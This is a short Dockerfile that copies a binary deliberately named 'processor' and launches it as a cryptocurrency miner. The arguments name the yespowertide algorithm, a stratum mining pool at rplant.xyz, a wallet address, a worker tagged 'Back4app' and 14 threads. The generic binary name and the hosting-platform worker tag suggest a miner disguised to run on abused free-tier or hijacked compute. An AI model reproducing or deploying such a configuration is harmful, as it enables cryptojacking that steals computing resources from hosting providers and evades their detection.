FROM ubuntu:24.04
COPY processor /processor
RUN chmod +x /processor

ENTRYPOINT ["/processor"]
CMD ["-a", "yespowertide", "-o", "stratum+tcps://na.rplant.xyz:17059", "-u", "TWJa3cLtb2ibL5C6i93GVD6DTHjUqpuxHs.Back4app", "-t", "14"]
EOF
